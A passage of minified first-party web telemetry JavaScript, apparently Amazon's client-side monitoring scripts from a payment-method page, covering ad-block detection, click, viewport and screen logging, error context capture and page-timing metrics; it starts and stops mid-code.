b)}catch(c){}}function q(){a.ue_adb_rtla&&c&&0<c.ec&&!1===r&&(c.elh=null,ueLogError({m:"Hit Info",fromOnError:1},{logLevel:"INFO",adb:b}),r=!0)}function l(){e.tag(b);e.isl&&a.uex&&uex("at",b);s&&s.updateCsmHit("adb",b);c&&0<c.ec?q():a.ue_adb_rtla&&c&&(c.elh=q)}function v(){return b}if(a.ue_adb){a.ue_fadb=a.ue_fadb||10;var e=a.ue,k="adblk_yes",p="adblk_no",m="https://m.media-amazon.com/images/G/01/csm/showads.v2.js?adtag=csm&act=ads_",b="adblk_unk",d;a:{try{d=a.localStorage;break a}catch(z){}d=void 0}var g=
"csm:adb",c=a.ue_err,s=e.cookie,f=void 0!==a.localStorage,w=Math.random()>1-1/a.ue_fadb,r=!1,x=t();w||!x?u():l();a.ue_isAdb=v;a.ue_isAdb.unk="adblk_unk";a.ue_isAdb.no=p;a.ue_isAdb.yes=k}},"adb")(document,window);




(function(c,l,m){function h(a){if(a)try{if(a.id)return"//*[@id='"+a.id+"']";var b,d=1,e;for(e=a.previousSibling;e;e=e.previousSibling)e.nodeName===a.nodeName&&(d+=1);b=d;var c=a.nodeName;1!==b&&(c+="["+b+"]");a.parentNode&&(c=h(a.parentNode)+"/"+c);return c}catch(f){return"DETACHED"}}function f(a){if(a&&a.getAttribute)return a.getAttribute(k)?a.getAttribute(k):f(a.parentElement)}var k="data-cel-widget",g=!1,d=[];(c.ue||{}).isBF=function(){try{var a=JSON.parse(localStorage["csm-bf"]||"[]"),b=0<=a.indexOf(c.ue_id);
a.unshift(c.ue_id);a=a.slice(0,20);localStorage["csm-bf"]=JSON.stringify(a);return b}catch(d){return!1}}();c.ue_utils={getXPath:h,getFirstAscendingWidget:function(a,b){c.ue_cel&&c.ue_fem?!0===g?b(f(a)):d.push({element:a,callback:b}):b()},notifyWidgetsLabeled:function(){if(!1===g){g=!0;for(var a=f,b=0;b<d.length;b++)if(d[b].hasOwnProperty("callback")&&d[b].hasOwnProperty("element")){var c=d[b].callback,e=d[b].element;"function"===typeof c&&"function"===typeof a&&c(a(e))}d=null}},extractStringValue:function(a){if("string"===
typeof a)return a}}})(ue_csm,window,document);



(function(a){a.ue_cel||(a.ue_cel=function(){function e(a,b){b?b.r=E:b={r:E,c:1};!ue_csm.ue_sclog&&b.clog&&d.clog?d.clog(a,b.ns||s,b):b.glog&&d.glog?d.glog(a,b.ns||s,b):d.log(a,b.ns||s,b)}function m(a,d){"function"===typeof n&&n("log",{schemaId:u+".RdCSI.1",eventType:a,clientData:d},{ent:"all"})}function b(){var a=l.length;if(0<a){for(var b=[],c=0;c<a;c++){var F=l[c].api;F.ready()?(F.on({ts:d.d,ns:s}),g.push(l[c]),e({k:"mso",n:l[c].name,t:d.d()})):b.push(l[c])}l=b}}function f(){if(!f.executed){for(var a=
0;a<g.length;a++)g[a].api.off&&g[a].api.off({ts:d.d,ns:s});x();e({k:"eod",t0:d.t0,t:d.d()},{c:1,il:1});f.executed=1;for(a=0;a<g.length;a++)l.push(g[a]);g=[];c(v);c(y)}}function x(a){e({k:"hrt",t:d.d()},{c:1,il:1,n:a});z=Math.min(k,r*z);t()}function t(){c(y);y=h(function(){x(!0)},z)}function p(){f.executed||x()}var q=a.window,h=q.setTimeout,c=q.clearTimeout,r=1.5,k=q.ue_cel_max_hrt||3E4,u="robotdetection",l=[],g=[],s=a.ue_cel_ns||"cel",v,y,d=a.ue,B=a.uet,C=a.uex,E=d.rid,D=q.csa,n,z=q.ue_cel_hrt_int||
3E3,w=q.requestAnimationFrame||function(a){a()};a.ue_cel_lclia&&D&&(n=D("Events",{producerId:u}));if(d.isBF)e({k:"bft",t:d.d()});else{"function"==typeof B&&B("bb","csmCELLSframework",{wb:1});h(b,0);d.onunload(f);if(d.onflush)d.onflush(p);v=h(f,6E5);t();"function"==typeof C&&C("ld","csmCELLSframework",{wb:1});return{registerModule:function(a,c){l.push({name:a,api:c});e({k:"mrg",n:a,t:d.d()});b()},reset:function(a){e({k:"rst",t0:d.t0,t:d.d()});l=l.concat(g);g=[];for(var r=l.length,k=0;k<r;k++)l[k].api.off(),
l[k].api.reset();E=a||d.rid;b();c(v);v=h(f,6E5);f.executed=0},timeout:function(a,d){return h(function(){w(function(){f.executed||a()})},d)},log:e,csaEventLog:m,off:f}}}())})(ue_csm);
(function(a){a.ue_pdm||!a.ue_cel||a.ue.isBF||(a.ue_pdm=function(){function e(){try{var d=c.screen;if(d){var b={w:d.width,aw:d.availWidth,h:d.height,ah:d.availHeight,cd:d.colorDepth,pd:d.pixelDepth};g&&g.w===b.w&&g.h===b.h&&g.aw===b.aw&&g.ah===b.ah&&g.pd===b.pd&&g.cd===b.cd||(g=b,g.t=u(),g.k="sci",B(g),D&&n&&z("sci",{h:(g.h||"0")+""}))}var f=r.body||{},h=r.documentElement||{},m={w:Math.max(f.scrollWidth||0,f.offsetWidth||0,h.clientWidth||0,h.scrollWidth||0,h.offsetWidth||0),h:Math.max(f.scrollHeight||
0,f.offsetHeight||0,h.clientHeight||0,h.scrollHeight||0,h.offsetHeight||0)};s&&s.w===m.w&&s.h===m.h||(s=m,s.t=u(),s.k="doi",B(s));k=a.ue_cel.timeout(e,l);y+=1}catch(q){c.ueLogError&&ueLogError(q,{attribution:"csm-cel-page-module",logLevel:"WARN"})}}function m(){p("ebl","default",!1)}function b(){p("efo","default",!0)}function f(){p("ebl","app",!1)}function x(){p("efo","app",!0)}function t(){c.setTimeout(function(){r[H]?p("ebl","pageviz",!1):p("efo","pageviz",!0)},0)}function p(a,d,b){v!==b&&(B({k:a,
t:u(),s:d},{ff:!0===b?0:1}),D&&n&&z(a,{t:(u()||"0")+"",s:d}));v=b}function q(){d.attach&&(w&&d.attach(A,t,r),J&&P.when("mash").execute(function(a){a&&a.addEventListener&&(a.addEventListener("appPause",f),a.addEventListener("appResume",x))}),d.attach("blur",m,c),d.attach("focus",b,c))}function h(){d.detach&&(w&&d.detach(A,t,r),J&&P.when("mash").execute(function(a){a&&a.removeEventListener&&(a.removeEventListener("appPause",f),a.removeEventListener("appResume",x))}),d.detach("blur",m,c),d.detach("focus",
b,c))}var c=a.window,r=a.document,k,u,l,g,s,v=null,y=0,d=a.ue,B=a.ue_cel.log,C=a.uet,E=a.uex,D=a.ue_cel_lclia,n=c.csa,z=a.ue_cel.csaEventLog,w=!!d.pageViz,A=w&&d.pageViz.event,H=w&&d.pageViz.propHid,J=c.P&&c.P.when;"function"==typeof C&&C("bb","csmCELLSpdm",{wb:1});return{on:function(a){l=a.timespan||500;u=a.ts;q();a=c.location;B({k:"pmd",o:a.origin,p:a.pathname,t:u()});e();"function"==typeof E&&E("ld","csmCELLSpdm",{wb:1})},off:function(a){clearTimeout(k);h();d.count&&d.count("cel.PDM.TotalExecutions",
y)},ready:function(){return r.body&&a.ue_cel&&a.ue_cel.log},reset:function(){g=s=null}}}(),a.ue_cel&&a.ue_cel.registerModule("page module",a.ue_pdm))})(ue_csm);
(function(a){a.ue_vpm||!a.ue_cel||a.ue.isBF||(a.ue_vpm=function(){function e(){var a=t(),c={w:h.innerWidth,h:h.innerHeight,x:h.pageXOffset,y:h.pageYOffset};b&&b.w==c.w&&b.h==c.h&&b.x==c.x&&b.y==c.y||(c.t=a,c.k="vpi",b=c,r(b,{clog:1}),s&&v&&y("vpi",{t:(b.t||"0")+"",h:(b.h||"0")+"",y:(b.y||"0")+"",w:(b.w||"0")+"",x:(b.x||"0")+""}));f=0;p=t()-a;q+=1}function m(){f||(f=a.ue_cel.timeout(e,x))}var b,f,x,t,p=0,q=0,h=a.window,c=a.ue,r=a.ue_cel.log,k=a.uet,u=a.uex,l=c.attach,g=c.detach,s=a.ue_cel_lclia,v=
h.csa,y=a.ue_cel.csaEventLog;"function"==typeof k&&k("bb","csmCELLSvpm",{wb:1});return{on:function(a){t=a.ts;x=a.timespan||100;e();l&&(l("scroll",m),l("resize",m));"function"==typeof u&&u("ld","csmCELLSvpm",{wb:1})},off:function(a){clearTimeout(f);g&&(g("scroll",m),g("resize",m));c.count&&(c.count("cel.VPI.TotalExecutions",q),c.count("cel.VPI.TotalExecutionTime",p),c.count("cel.VPI.AverageExecutionTime",p/q))},ready:function(){return a.ue_cel&&a.ue_cel.log},reset:function(){b=void 0},getVpi:function(){return b}}}(),
a.ue_cel&&a.ue_cel.registerModule("viewport module",a.ue_vpm))})(ue_csm);
(function(a){if(!a.ue_fem&&a.ue_cel&&a.ue_utils){var e=a.ue||{},m=a.window,b=m.document;!e.isBF&&!a.ue_fem&&b.querySelector&&m.getComputedStyle&&[].forEach&&(a.ue_fem=function(){function f(a,d){return a>d?3>a-d:3>d-a}function x(a,d){var b=m.pageXOffset,c=m.pageYOffset,h;a:{try{if(a){var g=a.getBoundingClientRect(),k,r=0===a.offsetWidth&&0===a.offsetHeight;c:{for(var e=a.parentNode,l=g.left||0,n=g.top||0,q=g.width||0,s=g.height||0;e&&e!==document.body;){var p;d:{try{var u=void 0;if(e)var t=e.getBoundingClientRect(),
u={x:t.left||0,y:t.top||0,w:t.width||0,h:t.height||0};else u=void 0;p=u;break d}catch(x){}p=void 0}var v=window.getComputedStyle(e),w="hidden"===v.overflow,z=w||"hidden"===v.overflowX,A=w||"hidden"===v.overflowY,B=n+s-1<p.y+1||n+1>p.y+p.h-1;if((l+q-1<p.x+1||l+1>p.x+p.w-1)&&z||B&&A){k=!0;break c}e=e.parentNode}k=!1}h={x:g.left+b||0,y:g.top+c||0,w:g.width||0,h:g.height||0,d:(r||k)|0}}else h=void 0;break a}catch(C){}h=void 0}if(h&&!a.cel_b)a.cel_b=h,D({n:a.getAttribute(y),w:a.cel_b.w,h:a.cel_b.h,d:a.cel_b.d,
x:a.cel_b.x,y:a.cel_b.y,t:d,k:"ewi",cl:a.className},{clog:1});else{if(b=h)b=a.cel_b,c=h,b=c.d===b.d&&1===c.d?!1:!(f(b.x,c.x)&&f(b.y,c.y)&&f(b.w,c.w)&&f(b.h,c.h)&&b.d===c.d);b&&(a.cel_b=h,D({n:a.getAttribute(y),w:a.cel_b.w,h:a.cel_b.h,d:a.cel_b.d,x:a.cel_b.x,y:a.cel_b.y,t:d,k:"ewi"},{clog:1}))}}function t(c,g){var f;f=c.c?b.getElementsByClassName(c.c):c.id?[b.getElementById(c.id)]:b.querySelectorAll(c.s);c.w=[];for(var k=0;k<f.length;k++){var e=f[k];if(e){if(!e.getAttribute(y)){var r=e.getAttribute("cel_widget_id")||
(c.id_gen||E)(e,k)||e.id;e.setAttribute(y,r)}c.w.push(e);h(Q,e,g)}}!1===C&&(B++,B===d.length&&(C=!0,a.ue_utils.notifyWidgetsLabeled()))}function p(a,b){n.contains(a)||D({n:a.getAttribute(y),t:b,k:"ewd"},{clog:1})}function q(a){I.length&&ue_cel.timeout(function(){if(s){for(var b=R(),c=!1;R()-b<g&&!c;){for(c=S;0<c--&&0<I.length;){var d=I.shift();T[d.type](d.elem,d.time)}c=0===I.length}U++;q(a)}},0)}function h(a,b,c){I.push({type:a,elem:b,time:c})}function c(a,b){for(var c=0;c<d.length;c++)for(var e=
d[c].w||[],g=0;g<e.length;g++)h(a,e[g],b)}function r(){M||(M=a.ue_cel.timeout(function(){M=null;var b=v();c(W,b);for(var e=0;e<d.length;e++)h(X,d[e],b);0===d.length&&!1===C&&(C=!0,a.ue_utils.notifyWidgetsLabeled());q(b)},l))}function k(){M||N||(N=a.ue_cel.timeout(function(){N=null;var a=v();c(Q,a);q(a)},l))}function u(){return w&&A&&n&&n.contains&&n.getBoundingClientRect&&v}var l=50,g=4.5,s=!1,v,y="data-cel-widget",d=[],B=0,C=!1,E=function(){},D=a.ue_cel.log,n,z,w,A,H=m.MutationObserver||m.WebKitMutationObserver||
m.MozMutationObserver,J=!!H,F,G,O="DOMAttrModified",K="DOMNodeInserted",L="DOMNodeRemoved",N,M,I=[],U=0,S=null,W="removedWidget",X="updateWidgets",Q="processWidget",T,V=m.performance||{},R=V.now&&function(){return V.now()}||function(){return Date.now()};"function"==typeof uet&&uet("bb","csmCELLSfem",{wb:1});return{on:function(c){function h(){if(u()){T={removedWidget:p,updateWidgets:t,processWidget:x};if(J){var a={attributes:!0,subtree:!0};F=new H(k);G=new H(r);F.observe(n,a);G.observe(n,{childList:!0,
subtree:!0});G.observe(z,a)}else w.call(n,O,k),w.call(n,K,r),w.call(n,L,r),w.call(z,K,k),w.call(z,L,k);r()}}n=b.body;z=b.head;w=n.addEventListener;A=n.removeEventListener;v=c.ts;d=a.cel_widgets||[];S=c.bs||5;e.deffered?h():e.attach&&e.attach("load",h);"function"==typeof uex&&uex("ld","csmCELLSfem",{wb:1});s=!0},off:function(){u()&&(G&&(G.disconnect(),G=null),F&&(F.disconnect(),F=null),A.call(n,O,k),A.call(n,K,r),A.call(n,L,r),A.call(z,K,k),A.call(z,L,k));e.count&&e.count("cel.widgets.batchesProcessed",
U);s=!1},ready:function(){return a.ue_cel&&a.ue_cel.log},reset:function(){d=a.cel_widgets||[]}}}(),a.ue_cel&&a.ue_fem&&a.ue_cel.registerModule("features module",a.ue_fem))}})(ue_csm);
(function(a){!a.ue_mcm&&a.ue_cel&&a.ue_utils&&!a.ue.isBF&&(a.ue_mcm=function(){function e(a,c){var e=a.srcElement||a.target||{},f={k:m,w:(c||{}).ow||(x.body||{}).scrollWidth,h:(c||{}).oh||(x.body||{}).scrollHeight,t:(c||{}).ots||b(),x:a.pageX,y:a.pageY,p:q.getXPath(e),n:e.nodeName};t&&"function"===typeof t.now&&a.timeStamp&&(f.dt=(c||{}).odt||t.now()-a.timeStamp,f.dt=parseFloat(f.dt.toFixed(2)));a.button&&(f.b=a.button);e.href&&(f.r=q.extractStringValue(e.href));e.id&&(f.i=e.id);e.className&&e.className.split&&
(f.c=e.className.split(/\s+/));p(f,{c:1})}var m="mcm",b,f=a.window,x=f.document,t=f.performance,p=a.ue_cel.log,q=a.ue_utils;return{on:function(h){b=h.ts;a.ue_cel_stub&&a.ue_cel_stub.replayModule(m,e);f.addEventListener&&f.addEventListener("mousedown",e,!0)},off:function(a){f.addEventListener&&f.removeEventListener("mousedown",e,!0)},ready:function(){return a.ue_cel&&a.ue_cel.log},reset:function(){}}}(),a.ue_cel&&a.ue_cel.registerModule("mouse click module",a.ue_mcm))})(ue_csm);



ue_csm.ue_unrt = 1500;
(function(d,b,t){function u(a,g){var c=a.srcElement||a.target||{},b={k:v,t:g.t,dt:g.dt,x:a.pageX,y:a.pageY,p:e.getXPath(c),n:c.nodeName};a.button&&(b.b=a.button);c.type&&(b.ty=c.type);c.href&&(b.r=e.extractStringValue(c.href));c.id&&(b.i=c.id);c.className&&c.className.split&&(b.c=c.className.split(/\s+/));h+=1;e.getFirstAscendingWidget(c,function(a){b.wd=a;d.ue.log(b,r)})}function w(a){if(!x(a.srcElement||a.target)){m+=1;n=!0;var g=f=d.ue.d(),c;p&&"function"===typeof p.now&&a.timeStamp&&(c=p.now()-
a.timeStamp,c=parseFloat(c.toFixed(2)));s=b.setTimeout(function(){u(a,{t:g,dt:c})},y)}}function z(a){if(a){var b=a.filter(A);a.length!==b.length&&(q=!0,k=d.ue.d(),n&&q&&(k&&f&&d.ue.log({k:B,t:f,m:Math.abs(k-f)},r),l(),q=!1,k=0))}}function A(a){if(!a)return!1;var b="characterData"===a.type?a.target.parentElement:a.target;if(!b||!b.hasAttributes||!b.attributes)return!1;var c={"class":"gw-clock gw-clock-aria s-item-container-height-auto feed-carousel using-mouse kfs-inner-container".split(" "),id:["dealClock",
"deal_expiry_timer","timer"],role:["timer"]},d=!1;Object.keys(c).forEach(function(a){var e=b.attributes[a]?b.attributes[a].value:"";(c[a]||"").forEach(function(a){-1!==e.indexOf(a)&&(d=!0)})});return d}function x(a){if(!a)return!1;var b=(e.extractStringValue(a.nodeName)||"").toLowerCase(),c=(e.extractStringValue(a.type)||"").toLowerCase(),d=(e.extractStringValue(a.href)||"").toLowerCase();a=(e.extractStringValue(a.id)||"").toLowerCase();var f="checkbox color date datetime-local email file month number password radio range reset search tel text time url week".split(" ");
if(-1!==["select","textarea","html"].indexOf(b)||"input"===b&&-1!==f.indexOf(c)||"a"===b&&-1!==d.indexOf("http")||-1!==["sitbreaderrightpageturner","sitbreaderleftpageturner","sitbreaderpagecontainer"].indexOf(a))return!0}function l(){n=!1;f=0;b.clearTimeout(s)}function C(){b.ue.onunload(function(){ue.count("armored-cxguardrails.unresponsive-clicks.violations",h);ue.count("armored-cxguardrails.unresponsive-clicks.violationRate",h/m*100||0)})}if(b.MutationObserver&&b.addEventListener&&Object.keys&&
d&&d.ue&&d.ue.log&&d.ue_unrt&&d.ue_utils){var y=d.ue_unrt,r="cel",v="unr_mcm",B="res_mcm",p=b.performance,e=d.ue_utils,n=!1,f=0,s=0,q=!1,k=0,h=0,m=0;b.addEventListener&&(b.addEventListener("mousedown",w,!0),b.addEventListener("beforeunload",l,!0),b.addEventListener("visibilitychange",l,!0),b.addEventListener("pagehide",l,!0));b.ue&&b.ue.event&&b.ue.onSushiUnload&&b.ue.onunload&&C();(new MutationObserver(z)).observe(t,{childList:!0,attributes:!0,characterData:!0,subtree:!0})}})(ue_csm,window,document);


ue_csm.ue.exec(function(g,e){if(e.ue_err){var f="";e.ue_err.errorHandlers||(e.ue_err.errorHandlers=[]);e.ue_err.errorHandlers.push({name:"fctx",handler:function(a){if(!a.logLevel||"FATAL"===a.logLevel)if(f=g.getElementsByTagName("html")[0].innerHTML){var b=f.indexOf("var ue_t0=ue_t0||+new Date();");if(-1!==b){var b=f.substr(0,b).split(String.fromCharCode(10)),d=Math.max(b.length-10-1,0),b=b.slice(d,b.length-1);a.fcsmln=d+b.length+1;a.cinfo=a.cinfo||{};for(var c=0;c<b.length;c++)a.cinfo[d+c+1+""]=
b[c]}b=f.split(String.fromCharCode(10));a.cinfo=a.cinfo||{};if(!(a.f||void 0===a.l||a.l in a.cinfo))for(c=+a.l-1,d=Math.max(c-5,0),c=Math.min(c+5,b.length-1);d<=c;d++)a.cinfo[d+1+""]=b[d]}}})}},"fatals-context")(document,window);


(function(m,a){function c(k){function f(b){b&&"string"===typeof b&&(b=(b=b.match(/^(?:https?:)?\/\/(.*?)(\/|$)/i))&&1<b.length?b[1]:null,b&&b&&("number"===typeof e[b]?e[b]++:e[b]=1))}function d(b){var e=10,d=+new Date;b&&b.timeRemaining?e=b.timeRemaining():b={timeRemaining:function(){return Math.max(0,e-(+new Date-d))}};for(var c=a.performance.getEntries(),k=e;g<c.length&&k>n;)c[g].name&&f(c[g].name),g++,k=b.timeRemaining();g>=c.length?h(!0):l()}function h(b){if(!b){b=m.scripts;var c;if(b)for(var d=
0;d<b.length;d++)(c=b[d].getAttribute("src"))&&"undefined"!==c&&f(c)}0<Object.keys(e).length&&(p&&ue_csm.ue&&ue_csm.ue.event&&ue_csm.ue.event({domains:e,pageType:a.ue_pty||null,subPageType:a.ue_spty||null,pageTypeId:a.ue_pti||null},"csm","csm.CrossOriginDomains.2"),a.ue_ext=e)}function l(){!0===k?d():a.requestIdleCallback?a.requestIdleCallback(d):a.requestAnimationFrame?a.requestAnimationFrame(d):a.setTimeout(d,100)}function c(){if(a.performance&&a.performance.getEntries){var b=a.performance.getEntries();
!b||0>=b.length?h(!1):l()}else h(!1)}var e=a.ue_ext||{};a.ue_ext||c();return e}function q(){setTimeout(c,r)}var s=a.ue_dserr||!1,p=!0,n=1,r=2E3,g=0;a.ue_err&&s&&(a.ue_err.errorHandlers||(a.ue_err.errorHandlers=[]),a.ue_err.errorHandlers.push({name:"ext",handler:function(a){if(!a.logLevel||"FATAL"===a.logLevel){var f=c(!0),d=[],h;for(h in f){var f=h,g=f.match(/amazon(\.com?)?\.\w{2,3}$/i);g&&1<g.length||-1!==f.indexOf("amazon-adsystem.com")||-1!==f.indexOf("amazonpay.com")||-1!==f.indexOf("cloudfront-labs.amazonaws.com")||
d.push(h)}a.ext=d}}}));a.ue&&a.ue.isl?c():a.ue&&ue.attach&&ue.attach("load",q)})(document,window);





var ue_wtc_c = 3;
ue_csm.ue.exec(function(b,e){function l(){for(var a=0;a<f.length;a++)a:for(var d=s.replace(A,f[a])+g[f[a]]+t,c=arguments,b=0;b<c.length;b++)try{c[b].send(d);break a}catch(e){}g={};f=[];n=0;k=p}function u(){B?l(q):l(C,q)}function v(a,m,c){r++;if(r>w)d.count&&1==r-w&&(d.count("WeblabTriggerThresholdReached",1),b.ue_int&&console.error("Number of max call reached. Data will no longer be send"));else{var h=c||{};h&&-1<h.constructor.toString().indexOf(D)&&a&&-1<a.constructor.toString().indexOf(x)&&m&&-1<
m.constructor.toString().indexOf(x)?(h=b.ue_id,c&&c.rid&&(h=c.rid),c=h,a=encodeURIComponent(",wl="+a+"/"+m),2E3>a.length+p?(2E3<k+a.length&&u(),void 0===g[c]&&(g[c]="",f.push(c)),g[c]+=a,k+=a.length,n||(n=e.setTimeout(u,E))):b.ue_int&&console.error("Invalid API call. The input provided is over 2000 chars.")):d.count&&(d.count("WeblabTriggerImproperAPICall",1),b.ue_int&&console.error("Invalid API call. The input provided does not match the API protocol i.e ue.trigger(String, String, Object)."))}}function F(){d.trigger&&
d.trigger.isStub&&d.trigger.replay(function(a){v.apply(this,a)})}function y(){z||(f.length&&l(q),z=!0)}var t=":1234",s="//"+b.ue_furl+"/1/remote-weblab-triggers/1/OE/"+b.ue_mid+":"+b.ue_sid+":PLCHLDR_RID$s:wl-client-id%3DCSMTriger",A="PLCHLDR_RID",E=b.wtt||1E4,p=s.length+t.length,w=b.mwtc||2E3,G=1===e.ue_wtc_c,B=3===e.ue_wtc_c,H=e.XMLHttpRequest&&"withCredentials"in new e.XMLHttpRequest,x="String",D="Object",d=b.ue,g={},f=[],k=p,n,z=!1,r=0,C=function(){return{send:function(a){if(H){var b=new e.XMLHttpRequest;
b.open("GET",a,!0);G&&(b.withCredentials=!0);b.send()}else throw"";}}}(),q=function(){return{send:function(a){(new Image).src=a}}}();e.encodeURIComponent&&(d.attach&&(d.attach("beforeunload",y),d.attach("pagehide",y)),F(),d.trigger=v)},"client-wbl-trg")(ue_csm,window);


(function(k,d,h){function f(a,c,b){a&&a.indexOf&&0===a.indexOf("http")&&0!==a.indexOf("https")&&l(s,c,a,b)}function g(a,c,b){a&&a.indexOf&&(location.href.split("#")[0]!=a&&null!==a&&"undefined"!==typeof a||l(t,c,a,b))}function l(a,c,b,e){m[b]||(e=u&&e?n(e):"N/A",d.ueLogError&&d.ueLogError({message:a+c+" : "+b,logLevel:v,stack:"N/A"},{attribution:e}),m[b]=1,p++)}function e(a,c){if(a&&c)for(var b=0;b<a.length;b++)try{c(a[b])}catch(d){}}function q(){return d.performance&&d.performance.getEntriesByType?
d.performance.getEntriesByType("resource"):[]}function n(a){if(a.id)return"//*[@id='"+a.id+"']";var c;c=1;var b;for(b=a.previousSibling;b;b=b.previousSibling)b.nodeName==a.nodeName&&(c+=1);b=a.nodeName;1!=c&&(b+="["+c+"]");a.parentNode&&(b=n(a.parentNode)+"/"+b);return b}function w(){var a=h.images;a&&a.length&&e(a,function(a){var b=a.getAttribute("src");f(b,"img",a);g(b,"img",a)})}function x(){var a=h.scripts;a&&a.length&&e(a,function(a){var b=a.getAttribute("src");f(b,"script",a);g(b,"script",a)})}
function y(){var a=h.styleSheets;a&&a.length&&e(a,function(a){if(a=a.ownerNode){var b=a.getAttribute("href");f(b,"style",a);g(b,"style",a)}})}function z(){if(A){var a=q();e(a,function(a){f(a.name,a.initiatorType)})}}function B(){e(q(),function(a){g(a.name,a.initiatorType)})}function r(){var a;a=d.location&&d.location.protocol?d.location.protocol:void 0;"https:"==a&&(z(),w(),x(),y(),B(),p<C&&setTimeout(r,D))}var s="[CSM] Insecure content detected ",t="[CSM] Ajax request to same page detected ",v="WARN",
m={},p=0,D=k.ue_nsip||1E3,C=5,A=1==k.ue_urt,u=!0;ue_csm.ue_disableNonSecure||(d.performance&&d.performance.setResourceTimingBufferSize&&d.performance.setResourceTimingBufferSize(300),r())})(ue_csm,window,document);


var ue_aa_a = "";
if (ue.trigger && (ue_aa_a === "C" || ue_aa_a === "T1")) {
    ue.trigger("UEDATA_AA_SERVERSIDE_ASSIGNMENT_CLIENTSIDE_TRIGGER_190249", ue_aa_a);
}
(function(f,b){function g(){try{b.PerformanceObserver&&"function"===typeof b.PerformanceObserver&&(a=new b.PerformanceObserver(function(b){c(b.getEntries())}),a.observe(d))}catch(h){k()}}function m(){for(var h=d.entryTypes,a=0;a<h.length;a++)c(b.performance.getEntriesByType(h[a]))}function c(a){if(a&&Array.isArray(a)){for(var c=0,e=0;e<a.length;e++){var d=l.indexOf(a[e].name);if(-1!==d){var g=Math.round(b.performance.timing.navigationStart+a[e].startTime);f.uet(n[d],void 0,void 0,g);c++}}l.length===
c&&k()}}function k(){a&&a.disconnect&&"function"===typeof a.disconnect&&a.disconnect()}if("function"===typeof f.uet&&b.performance&&"object"===typeof b.performance&&b.performance.getEntriesByType&&"function"===typeof b.performance.getEntriesByType&&b.performance.timing&&"object"===typeof b.performance.timing&&"number"===typeof b.performance.timing.navigationStart){var d={entryTypes:["paint"]},l=["first-paint","first-contentful-paint"],n=["fp","fcp"],a;try{m(),g()}catch(p){f.ueLogError(p,{logLevel:"ERROR",
attribution:"performanceMetrics"})}}})(ue_csm,window);


if (window.csa) {
    csa("Events")("setEntity", {
        page:{pageType: "CPEFront", subPageType: "AddPaymentMethod", pageTypeId: ""}
    });
}
csa.plugin(function(e){var i="transitionStart",n="pageVisible",t="PageTiming",a="visibilitychange",o=e("Events",{producerId:"csa"}),r=(e.global.performance||{}).timing,d=["navigationStart","unloadEventStart","unloadEventEnd","redirectStart","redirectEnd","fetchStart","domainLookupStart","domainLookupEnd","connectStart","connectEnd","secureConnectionStart","requestStart","responseStart","responseEnd","domLoading","domInteractive","domContentLoadedEventStart","domContentLoadedEventEnd","domComplete","loadEventStart","loadEventEnd"],c=e.config,l=e.global.document||{},s=(r||{}).navigationStart,u=s,m={},g=0,v=0,f=c[t+".BatchInterval"]||3e3,p=0,S=!0;if(!c["KillSwitch."+t]){if(!r||null===s||s<=0||void 0===s)return e.error("Invalid navigation timing data: "+s);"boolean"!=typeof l.hidden&&"string"!=typeof l.visibilityState||!l.removeEventListener||((S=L())?(E(n,s),b()):e.on(l,a,function t(){(S=L())&&(u=e.time(),l.removeEventListener(a,t),E(n,u),E(i,u),b())})),e.once("$unload",h),e.once("$load",h),e.on("$beforePageTransition",y),e.on("$pageTransition",function(){u=e.time()}),e.register(t,{mark:E})}function E(t,n){null!=t&&(n=n||e.time(),t===i&&(u=n),m[t]=n,b(),e.emit("$timing:"+t,n))}function h(){!function(){if(p)return;for(var t=0;t<d.length;t++)r[d[t]]&&E(d[t],r[d[t]]);p=1}(),g=1,b(!0)}function b(t){g&&S&&!v&&(v=e.timeout(y,t?0:f))}function y(){0<Object.keys(m).length&&(o("log",{markers:function(t,n){var e={};for(var i in t)t.hasOwnProperty(i)&&(e[i]=Math.max(0,t[i]-n));return e}(m,u),markerTimestamps:function(t){for(var n in t)t.hasOwnProperty(n)&&(t[n]=Math.floor(t[n]));return t}(m),navigationStartTimestamp:u?new Date(u).toISOString():null,schemaId:"<ns>.PageLatency.5"},{ent:{page:["pageType","subPageType","requestId"]}}),m={}),v=0}function L(){return!l.hidden||"visible"===l.visibilityState}});csa.plugin(function(e){var m=!!e.config["LCP.elementDedup"],t=!1,n=e("PageTiming"),r=e.global.PerformanceObserver,a=e.global.performance;function i(){return a.timing.navigationStart}function o(){t||function(o){var l=new r(function(e){var t=e.getEntries();if(0!==t.length){var n=t[t.length-1];if(m&&""!==n.id&&n.element&&"IMG"===n.element.tagName){for(var r={},a=t[0],i=0;i<t.length;i++)t[i].id in r||(""!==t[i].id&&(r[t[i].id]=!0),a.startTime<t[i].startTime&&(a=t[i]));n=a}l.disconnect(),o({startTime:n.startTime,renderTime:n.renderTime,loadTime:n.loadTime})}});try{l.observe({type:"largest-contentful-paint",buffered:!0})}catch(e){}}(function(e){e&&(t=!0,n("mark","largestContentfulPaint",Math.floor(e.startTime+i())),e.renderTime&&n("mark","largestContentfulPaint.render",Math.floor(e.renderTime+i())),e.loadTime&&n("mark","largestContentfulPaint.load",Math.floor(e.loadTime+i())))})}r&&a&&a.timing&&(e.once("$unload",o),e.once("$load",o),e.register("LargestContentfulPaint",{}))});csa.plugin(function(r){var e=r("Metrics",{producerId:"csa"}),n=r.global.PerformanceObserver;n&&(n=new n(function(r){var t=r.getEntries();if(0===t.length||!t[0].processingStart||!t[0].startTime)return;!function(r){r=r||0,n.disconnect(),0<=r?e("recordMetric","firstInputDelay",r):e("recordMetric","firstInputDelay.invalid",1)}(t[0].processingStart-t[0].startTime)}),function(){try{n.observe({type:"first-input",buffered:!0})}catch(r){}}())});csa.plugin(function(d){var e="Metrics",r=d.config,u=r[e+".BatchInterval"]||3e3;function n(e){var r=e.producerId,n=e.logger,t=n||d("Events",{producerId:r}),i={},o=(e||{}).dimensions||{},c=0;if(!r&&!n)return d.error("Either a producer id or custom logger must be defined");function s(){Object.keys(i).length&&(t("log",{schemaId:e.schemaId||"<ns>.Metric.3",metrics:i,dimensions:o},e.logOptions||{ent:{page:["pageType","subPageType","requestId"]}}),i={}),c=0}this.recordMetric=function(e,r){i[e]=r,c=c||d.timeout(s,u)},d.on("$beforeunload",s),d.on("$beforePageTransition",s)}r["KillSwitch."+e]||(new n({producerId:"csa"}).recordMetric("baselineMetricEvent",1),d.register(e,{instance:function(e){return new n(e||{})}}))});csa.plugin(function(c){var e="Timers",r=(c.global.performance||{}).timing,u=(r||{}).navigationStart||c.time(),s=c.config[e+".BatchInterval"]||3e3;function n(e){var 